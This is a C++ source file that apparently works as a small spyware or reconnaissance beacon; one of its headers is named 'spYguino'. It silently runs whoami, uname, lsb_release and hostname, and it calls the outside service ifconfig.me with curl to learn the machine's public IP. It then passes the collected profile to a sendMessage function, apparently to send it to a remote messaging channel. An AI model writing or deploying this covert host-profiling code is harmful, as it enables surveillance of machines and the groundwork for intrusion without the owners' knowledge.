#include <stdio.h>
#include <iostream>
#include <cstdlib>  
#include <string>
#include "tg.h"
#include "spYguino.h"

std::string readPublicIp()
{
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen("curl -s ifconfig.me", "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try { 
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string readIp()
{
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen("hostname -I", "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string readDistro()
{
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen("lsb_release -a 2> /dev/null", "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string readKernelVersion()
{
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen("uname -r", "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string readUser()
{
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen("whoami", "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

SystemProfile systemprofile()
{

    struct SystemProfile currentProfile;
    currentProfile.user = readUser();
    currentProfile.kernelVersion = readKernelVersion();
    currentProfile.distro = readDistro();
    currentProfile.ip = readIp();
    currentProfile.ip_publica = readPublicIp();
    return currentProfile;
}

int main(int argc, char const *argv[])
{
    struct SystemProfile currentProfile;
    
    currentProfile = systemprofile();
    // std::cout << currentProfile.user << std::endl;
    // std::cout << currentProfile.kernelVersion << std::endl;
    // std::cout << currentProfile.distro << std::endl;
    // std::cout << currentProfile.ip << std::endl;
    sendMessage(currentProfile);
    
    return 0;
}


